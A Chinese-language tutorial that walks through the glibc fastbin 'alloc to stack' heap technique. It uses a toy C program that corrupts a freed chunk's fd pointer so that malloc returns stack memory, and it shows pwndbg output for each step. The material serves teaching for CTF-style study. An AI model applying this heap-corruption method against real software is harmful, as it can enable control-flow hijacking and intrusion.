> 参考资料：[https://wiki.x10sec.org/pwn/heap/fastbin_attack/#alloc-to-stack](https://wiki.x10sec.org/pwn/heap/fastbin_attack/#alloc-to-stack)
>
> [https://xz.aliyun.com/t/7490](https://xz.aliyun.com/t/7490)
>
> 附件下载：
>
> 链接: [https://pan.baidu.com/s/1dplP_JkSdl9M7F9sUEDVeQ](https://pan.baidu.com/s/1dplP_JkSdl9M7F9sUEDVeQ)  密码: mbht
>
> --来自百度网盘超级会员V3的分享
>

# 基本原理
从名字就可以知道这种攻击方式是将堆块分配到了栈上，该项技术的核心点在于劫持fastbin链表中chunk的fd指针，将fd指针修改为我们想要分配的栈上，从而控制栈中的一些关键数据，比如返回地址等。**<font style="color:#F5222D;">在分配堆到栈上时，栈上要存在满足条件的chunk.size值，也就是说，我们要malloc多少的内存，其size一定要对应。</font>**

# 演示
这里我们使用CTFwiki上的例子来进行演示。将置于栈中的fake_chunk称为stack_chunk。

代码如下：

```c
#include<stdio.h>

typedef struct _chunk
{
    long long pre_size;
    long long size;
    long long fd;
    long long bk;  
} CHUNK,*PCHUNK;

int main(void)
{
    CHUNK stack_chunk;

    void *chunk1;
    void *chunk_a;

    stack_chunk.size=0x21;
    chunk1=malloc(0x10);

    free(chunk1);

    *(long long *)chunk1=&stack_chunk;
    malloc(0x10);
    chunk_a=malloc(0x10);
    return 0;
}
```

## 代码说明
简单的说一下这个程序，首先定义了两个指针，**<font style="color:#F5222D;">然后将结构体中的size变量赋值为0x21。这是因为在malloc(0x10)后，chunk的size字段为21。</font>**然后将malloc(0x10)之后的data段地址返回给了chunk1指针。在free(chunk1)之后，将stack_chunk的地址赋值给了指针chunk1所指向的地址，也就是说在下一次malloc之后，堆块会被分配到栈上。然后执行了两次malloc，此时栈已经被控制，可以任意写入内容。

## 编译
看一下程序的运行环境：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604369274041-71000180-7873-4a16-9626-65a6e5e7bcd9.png)

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604369280379-f3db9a7b-f100-4464-af16-f9e2ffebdc4d.png)

libc版本为2.23，ubuntu版本为16.04.7

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604369503019-34a5bd16-ccc3-43ad-8d63-4009dafd7e19.png)

## gdb调试
### 19行下断点，stack_chunk=0x21
对代码的第19行下断点，此时stack_chunk.size已经初始化为0x21。

```c
pwndbg> b 19
Breakpoint 1 at 0x400576: file alloc_to_stack.c, line 19.
pwndbg> l
14	
15	    void *chunk1;
16	    void *chunk_a;
17	
18	    stack_chunk.size=0x21;
19	    chunk1=malloc(0x10);
20	
21	    free(chunk1);
22	
23	    *(long long *)chunk1=&stack_chunk;
pwndbg> r
Starting program: /home/ubuntu/Desktop/alloc_to_stack_demo 

Breakpoint 1, main () at alloc_to_stack.c:19
19	    chunk1=malloc(0x10);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────
 RAX  0x400566 (main) ◂— 0x30ec8348e5894855
 RBX  0x0
 RCX  0x0
 RDX  0x7fffffffdeb8 —▸ 0x7fffffffe25e ◂— 'XDG_VTNR=7'
 RDI  0x1
 RSI  0x7fffffffdea8 —▸ 0x7fffffffe235 ◂— '/home/ubuntu/Desktop/alloc_to_stack_demo'
 R8   0x400630 (__libc_csu_fini) ◂— 0x8ec83480000c3f3
 R9   0x7ffff7de7af0 (_dl_fini) ◂— push   rbp
 R10  0x846
 R11  0x7ffff7a2d750 (__libc_start_main) ◂— push   r14
 R12  0x400470 (_start) ◂— 0x89485ed18949ed31
 R13  0x7fffffffdea0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffddc0 —▸ 0x4005c0 (__libc_csu_init) ◂— 0x41ff894156415741
 RSP  0x7fffffffdd90 —▸ 0x7fffffffddbe ◂— 0x4005c00000
 RIP  0x400576 (main+16) ◂— 0xfed0e800000010bf
──────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────
 ► 0x400576 <main+16>    mov    edi, 0x10
   0x40057b <main+21>    call   malloc@plt <malloc@plt>
 
   0x400580 <main+26>    mov    qword ptr [rbp - 8], rax
   0x400584 <main+30>    mov    rax, qword ptr [rbp - 8]
   0x400588 <main+34>    mov    rdi, rax
   0x40058b <main+37>    call   free@plt <free@plt>
 
   0x400590 <main+42>    lea    rdx, [rbp - 0x30]
   0x400594 <main+46>    mov    rax, qword ptr [rbp - 8]
   0x400598 <main+50>    mov    qword ptr [rax], rdx
   0x40059b <main+53>    mov    edi, 0x10
   0x4005a0 <main+58>    call   malloc@plt <malloc@plt>
───────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────────────────────
In file: /home/ubuntu/Desktop/alloc_to_stack.c
   14 
   15     void *chunk1;
   16     void *chunk_a;
   17 
   18     stack_chunk.size=0x21;
 ► 19     chunk1=malloc(0x10);
   20 
   21     free(chunk1);
   22 
   23     *(long long *)chunk1=&stack_chunk;
   24     malloc(0x10);
───────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────
00:0000│ rsp  0x7fffffffdd90 —▸ 0x7fffffffddbe ◂— 0x4005c00000
01:0008│      0x7fffffffdd98 ◂— 0x21 /* '!' */
02:0010│      0x7fffffffdda0 —▸ 0x4005c0 (__libc_csu_init) ◂— 0x41ff894156415741
03:0018│      0x7fffffffdda8 —▸ 0x400470 (_start) ◂— 0x89485ed18949ed31
04:0020│      0x7fffffffddb0 —▸ 0x7fffffffdea0 ◂— 0x1
05:0028│      0x7fffffffddb8 ◂— 0x0
06:0030│ rbp  0x7fffffffddc0 —▸ 0x4005c0 (__libc_csu_init) ◂— 0x41ff894156415741
07:0038│      0x7fffffffddc8 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax
─────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────
 ► f 0           400576 main+16
   f 1     7ffff7a2d840 __libc_start_main+240
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

来看一下此时的本地变量的值：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604369810246-213e34e6-aa58-4769-a03a-244d98806018.png)

由于除了stack_chunk.size其他都没有被初始化，因此他们的值是乱七八糟的，这里不用理会。

### 21行下断点，执行chunk1=malloc(0x10);
对代码的第21行下断点，此时代码已经执行chunk1=malloc(0x10);

```c
pwndbg> b 21
Breakpoint 2 at 0x400584: file alloc_to_stack.c, line 21.
pwndbg> c
Continuing.

Breakpoint 2, main () at alloc_to_stack.c:21
21	    free(chunk1);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────
*RAX  0x602010 ◂— 0x0
 RBX  0x0
*RCX  0x7ffff7dd1b20 (main_arena) ◂— add    byte ptr [rax], al /* 0x100000000 */
*RDX  0x602010 ◂— 0x0
*RDI  0x7ffff7dd1b20 (main_arena) ◂— add    byte ptr [rax], al /* 0x100000000 */
*RSI  0x602020 ◂— 0x0
*R8   0x602000 ◂— 0x0
*R9   0xd
*R10  0x7ffff7dd1b78 (main_arena+88) —▸ 0x602020 ◂— 0x0
*R11  0x0
 R12  0x400470 (_start) ◂— 0x89485ed18949ed31
 R13  0x7fffffffdea0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffddc0 —▸ 0x4005c0 (__libc_csu_init) ◂— 0x41ff894156415741
 RSP  0x7fffffffdd90 —▸ 0x7fffffffddbe ◂— 0x4005c00000
*RIP  0x400584 (main+30) ◂— 0xe8c78948f8458b48
──────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────
   0x400576 <main+16>    mov    edi, 0x10
   0x40057b <main+21>    call   malloc@plt <malloc@plt>
 
   0x400580 <main+26>    mov    qword ptr [rbp - 8], rax
 ► 0x400584 <main+30>    mov    rax, qword ptr [rbp - 8]
   0x400588 <main+34>    mov    rdi, rax
   0x40058b <main+37>    call   free@plt <free@plt>
 
   0x400590 <main+42>    lea    rdx, [rbp - 0x30]
   0x400594 <main+46>    mov    rax, qword ptr [rbp - 8]
   0x400598 <main+50>    mov    qword ptr [rax], rdx
   0x40059b <main+53>    mov    edi, 0x10
   0x4005a0 <main+58>    call   malloc@plt <malloc@plt>
───────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────────────────────
In file: /home/ubuntu/Desktop/alloc_to_stack.c
   16     void *chunk_a;
   17 
   18     stack_chunk.size=0x21;
   19     chunk1=malloc(0x10);
   20 
 ► 21     free(chunk1);
   22 
   23     *(long long *)chunk1=&stack_chunk;
   24     malloc(0x10);
   25     chunk_a=malloc(0x10);
   26     return 0;
───────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────
00:0000│ rsp  0x7fffffffdd90 —▸ 0x7fffffffddbe ◂— 0x4005c00000
01:0008│      0x7fffffffdd98 ◂— 0x21 /* '!' */
02:0010│      0x7fffffffdda0 —▸ 0x4005c0 (__libc_csu_init) ◂— 0x41ff894156415741
03:0018│      0x7fffffffdda8 —▸ 0x400470 (_start) ◂— 0x89485ed18949ed31
04:0020│      0x7fffffffddb0 —▸ 0x7fffffffdea0 ◂— 0x1
05:0028│      0x7fffffffddb8 —▸ 0x602010 ◂— 0x0
06:0030│ rbp  0x7fffffffddc0 —▸ 0x4005c0 (__libc_csu_init) ◂— 0x41ff894156415741
07:0038│      0x7fffffffddc8 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax
─────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────
 ► f 0           400584 main+30
   f 1     7ffff7a2d840 __libc_start_main+240
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

看一下堆的情况：

```c
pwndbg> heap
Allocated chunk
Addr: 0x602000
Size: 0x00

pwndbg> x/16gx &main_arena
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000602020 #top_chunk
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78
0x7ffff7dd1b90 <main_arena+112>:	0x00007ffff7dd1b78	0x00007ffff7dd1b88
pwndbg> 
```

### 23行下断点，执行free(chunk1);
对23行下断点，执行free(chunk1);

```c
pwndbg> b 23
Breakpoint 3 at 0x400590: file alloc_to_stack.c, line 23.
pwndbg> c
Continuing.

Breakpoint 3, main () at alloc_to_stack.c:23
23	    *(long long *)chunk1=&stack_chunk;
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────
*RAX  0x0
 RBX  0x0
*RCX  0x7ffff7dd1b00 (__memalign_hook) —▸ 0x7ffff7a92ea0 (memalign_hook_ini) ◂— push   r12
*RDX  0x0
*RDI  0xffffffff
*RSI  0x7ffff7dd1b28 (main_arena+8) —▸ 0x602000 ◂— 0x0
*R8   0x602010 ◂— 0x0
*R9   0x0
*R10  0x8b8
*R11  0x7ffff7a91540 (free) ◂— push   r13
 R12  0x400470 (_start) ◂— 0x89485ed18949ed31
 R13  0x7fffffffdea0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffddc0 —▸ 0x4005c0 (__libc_csu_init) ◂— 0x41ff894156415741
 RSP  0x7fffffffdd90 —▸ 0x7fffffffddbe ◂— 0x4005c00000
*RIP  0x400590 (main+42) ◂— 0xf8458b48d0558d48
──────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────
   0x40057b <main+21>    call   malloc@plt <malloc@plt>
 
   0x400580 <main+26>    mov    qword ptr [rbp - 8], rax
   0x400584 <main+30>    mov    rax, qword ptr [rbp - 8]
   0x400588 <main+34>    mov    rdi, rax
   0x40058b <main+37>    call   free@plt <free@plt>
 
 ► 0x400590 <main+42>    lea    rdx, [rbp - 0x30]
   0x400594 <main+46>    mov    rax, qword ptr [rbp - 8]
   0x400598 <main+50>    mov    qword ptr [rax], rdx
   0x40059b <main+53>    mov    edi, 0x10
   0x4005a0 <main+58>    call   malloc@plt <malloc@plt>
 
   0x4005a5 <main+63>    mov    edi, 0x10
───────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────────────────────
In file: /home/ubuntu/Desktop/alloc_to_stack.c
   18     stack_chunk.size=0x21;
   19     chunk1=malloc(0x10);
   20 
   21     free(chunk1);
   22 
 ► 23     *(long long *)chunk1=&stack_chunk;
   24     malloc(0x10);
   25     chunk_a=malloc(0x10);
   26     return 0;
   27 }
───────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────
00:0000│ rsp  0x7fffffffdd90 —▸ 0x7fffffffddbe ◂— 0x4005c00000
01:0008│      0x7fffffffdd98 ◂— 0x21 /* '!' */
02:0010│      0x7fffffffdda0 —▸ 0x4005c0 (__libc_csu_init) ◂— 0x41ff894156415741
03:0018│      0x7fffffffdda8 —▸ 0x400470 (_start) ◂— 0x89485ed18949ed31
04:0020│      0x7fffffffddb0 —▸ 0x7fffffffdea0 ◂— 0x1
05:0028│      0x7fffffffddb8 —▸ 0x602010 ◂— 0x0
06:0030│ rbp  0x7fffffffddc0 —▸ 0x4005c0 (__libc_csu_init) ◂— 0x41ff894156415741
07:0038│      0x7fffffffddc8 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax
─────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────
 ► f 0           400590 main+42
   f 1     7ffff7a2d840 __libc_start_main+240
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

再次来看一下堆的状况：

```c
pwndbg> heap
Allocated chunk
Addr: 0x602000
Size: 0x00

pwndbg> bin
fastbins
0x20: 0x602000 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> x/16gx &main_arena
0x7ffff7dd1b20 <main_arena>:	0x0000000000000000	0x0000000000602000 #chunk
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000602020 #top_chunk
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78
0x7ffff7dd1b90 <main_arena+112>:	0x00007ffff7dd1b78	0x00007ffff7dd1b88
pwndbg> x/16gx 0x602000
0x602000:	0x0000000000000000	0x0000000000000021
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000020fe1
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

### 24行下断点，执行*(long long *)chunk1=&stack_chunk;
对代码的第24行下断点，程序执行*(long long *)chunk1=&stack_chunk;

这个代码的意思是将stack_chunk的地址赋值给指针chunk1所指向的地址。

```c
pwndbg> b 24
Breakpoint 4 at 0x40059b: file alloc_to_stack.c, line 24.
pwndbg> c
Continuing.

Breakpoint 4, main () at alloc_to_stack.c:24
24	    malloc(0x10);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────
*RAX  0x602010 —▸ 0x7fffffffdd90 —▸ 0x7fffffffddbe ◂— 0x4005c00000
 RBX  0x0
 RCX  0x7ffff7dd1b00 (__memalign_hook) —▸ 0x7ffff7a92ea0 (memalign_hook_ini) ◂— push   r12
*RDX  0x7fffffffdd90 —▸ 0x7fffffffddbe ◂— 0x4005c00000
 RDI  0xffffffff
 RSI  0x7ffff7dd1b28 (main_arena+8) —▸ 0x602000 ◂— 0x0
 R8   0x602010 —▸ 0x7fffffffdd90 —▸ 0x7fffffffddbe ◂— 0x4005c00000
 R9   0x0
 R10  0x8b8
 R11  0x7ffff7a91540 (free) ◂— push   r13
 R12  0x400470 (_start) ◂— 0x89485ed18949ed31
 R13  0x7fffffffdea0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffddc0 —▸ 0x4005c0 (__libc_csu_init) ◂— 0x41ff894156415741
 RSP  0x7fffffffdd90 —▸ 0x7fffffffddbe ◂— 0x4005c00000
*RIP  0x40059b (main+53) ◂— 0xfeabe800000010bf
──────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────
   0x400588 <main+34>    mov    rdi, rax
   0x40058b <main+37>    call   free@plt <free@plt>
 
   0x400590 <main+42>    lea    rdx, [rbp - 0x30]
   0x400594 <main+46>    mov    rax, qword ptr [rbp - 8]
   0x400598 <main+50>    mov    qword ptr [rax], rdx
 ► 0x40059b <main+53>    mov    edi, 0x10
   0x4005a0 <main+58>    call   malloc@plt <malloc@plt>
 
   0x4005a5 <main+63>    mov    edi, 0x10
   0x4005aa <main+68>    call   malloc@plt <malloc@plt>
 
   0x4005af <main+73>    mov    qword ptr [rbp - 0x10], rax
   0x4005b3 <main+77>    mov    eax, 0
───────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────────────────────
In file: /home/ubuntu/Desktop/alloc_to_stack.c
   19     chunk1=malloc(0x10);
   20 
   21     free(chunk1);
   22 
   23     *(long long *)chunk1=&stack_chunk;
 ► 24     malloc(0x10);
   25     chunk_a=malloc(0x10);
   26     return 0;
   27 }
───────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────
00:0000│ rdx rsp  0x7fffffffdd90 —▸ 0x7fffffffddbe ◂— 0x4005c00000
01:0008│          0x7fffffffdd98 ◂— 0x21 /* '!' */
02:0010│          0x7fffffffdda0 —▸ 0x4005c0 (__libc_csu_init) ◂— 0x41ff894156415741
03:0018│          0x7fffffffdda8 —▸ 0x400470 (_start) ◂— 0x89485ed18949ed31
04:0020│          0x7fffffffddb0 —▸ 0x7fffffffdea0 ◂— 0x1
05:0028│          0x7fffffffddb8 —▸ 0x602010 —▸ 0x7fffffffdd90 —▸ 0x7fffffffddbe ◂— 0x4005c00000
06:0030│ rbp      0x7fffffffddc0 —▸ 0x4005c0 (__libc_csu_init) ◂— 0x41ff894156415741
07:0038│          0x7fffffffddc8 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax
─────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────
 ► f 0           40059b main+53
   f 1     7ffff7a2d840 __libc_start_main+240
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

再看一下本地变量的值：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604371417551-637bec27-7296-445e-9e30-a9fb957d855c.png)

可以看到在执行*(long long *)chunk1=&stack_chunk;代码之后，可以猜测0x602010处的内容已经被覆盖为stack_chunk的地址，也就是fd指针被覆盖，我们来验证一下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604371851508-b73696cd-5269-40c0-a843-fbe26b923030.png)

### 26行下断点，执行两个malloc
在代码的26行下断点，让程序执行两个malloc：

```c
pwndbg> b 26
Breakpoint 5 at 0x4005b3: file alloc_to_stack.c, line 26.
pwndbg> c
Continuing.

Breakpoint 5, main () at alloc_to_stack.c:26
26	    return 0;
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────
*RAX  0x7fffffffdda0 —▸ 0x4005c0 (__libc_csu_init) ◂— 0x41ff894156415741
 RBX  0x0
*RCX  0x7ffff7dd1b20 (main_arena) ◂— 0
*RDX  0x7fffffffdda0 —▸ 0x4005c0 (__libc_csu_init) ◂— 0x41ff894156415741
*RDI  0x0
*RSI  0x7ffff7dd1b20 (main_arena) ◂— 0
*R8   0x4005c0 (__libc_csu_init) ◂— 0x41ff894156415741
 R9   0x0
 R10  0x8b8
 R11  0x7ffff7a91540 (free) ◂— push   r13
 R12  0x400470 (_start) ◂— 0x89485ed18949ed31
 R13  0x7fffffffdea0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffddc0 —▸ 0x4005c0 (__libc_csu_init) ◂— 0x41ff894156415741
 RSP  0x7fffffffdd90 —▸ 0x7fffffffddbe ◂— 0x4005c00000
*RIP  0x4005b3 (main+77) ◂— 0x66c3c900000000b8
──────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────
   0x40059b       <main+53>                  mov    edi, 0x10
   0x4005a0       <main+58>                  call   malloc@plt <malloc@plt>
 
   0x4005a5       <main+63>                  mov    edi, 0x10
   0x4005aa       <main+68>                  call   malloc@plt <malloc@plt>
 
   0x4005af       <main+73>                  mov    qword ptr [rbp - 0x10], rax
 ► 0x4005b3       <main+77>                  mov    eax, 0
   0x4005b8       <main+82>                  leave  
   0x4005b9       <main+83>                  ret    
    ↓
   0x7ffff7a2d840 <__libc_start_main+240>    mov    edi, eax
   0x7ffff7a2d842 <__libc_start_main+242>    call   exit <exit>
 
   0x7ffff7a2d847 <__libc_start_main+247>    xor    edx, edx
───────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────────────────────
In file: /home/ubuntu/Desktop/alloc_to_stack.c
   21     free(chunk1);
   22 
   23     *(long long *)chunk1=&stack_chunk;
   24     malloc(0x10);
   25     chunk_a=malloc(0x10);
 ► 26     return 0;
   27 }
───────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────
00:0000│ rsp      0x7fffffffdd90 —▸ 0x7fffffffddbe ◂— 0x4005c00000
01:0008│          0x7fffffffdd98 ◂— 0x21 /* '!' */
02:0010│ rax rdx  0x7fffffffdda0 —▸ 0x4005c0 (__libc_csu_init) ◂— 0x41ff894156415741
03:0018│          0x7fffffffdda8 —▸ 0x400470 (_start) ◂— 0x89485ed18949ed31
04:0020│          0x7fffffffddb0 —▸ 0x7fffffffdda0 —▸ 0x4005c0 (__libc_csu_init) ◂— 0x41ff894156415741
05:0028│          0x7fffffffddb8 —▸ 0x602010 —▸ 0x7fffffffdd90 —▸ 0x7fffffffddbe ◂— 0x4005c00000
06:0030│ rbp      0x7fffffffddc0 —▸ 0x4005c0 (__libc_csu_init) ◂— 0x41ff894156415741
07:0038│          0x7fffffffddc8 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax
─────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────
 ► f 0           4005b3 main+77
   f 1     7ffff7a2d840 __libc_start_main+240
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>
```

本地变量：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604372239684-c9442949-c417-4458-bdee-a907b0169f11.png)

```c
pwndbg> x/16gx 0x602000
0x602000:	0x0000000000000000	0x0000000000000021
0x602010:	0x00007fffffffdd90	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000020fe1
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
pwndbg>
```

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604372372760-dad4fc8e-509e-43fe-9cd3-047fe1d5f50f.png)

从上面chunk_a的值从原来的0x7fffffffdd90变为0x7fffffffdda0，这说明堆块已经被分配到了栈上。

> 第一次malloc是使用了0x602000的空间
>
> 第二次malloc是使用了栈上的空间
>
> 假如说看一下此时的bin的话：
>
> ![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604373863827-f0d9c9d1-5be1-4756-8be0-c4805e38f6b4.png)
>
> 下一次malloc就会分配到0x4005c0处（肯定会崩溃的，因为没有合法的size）
>



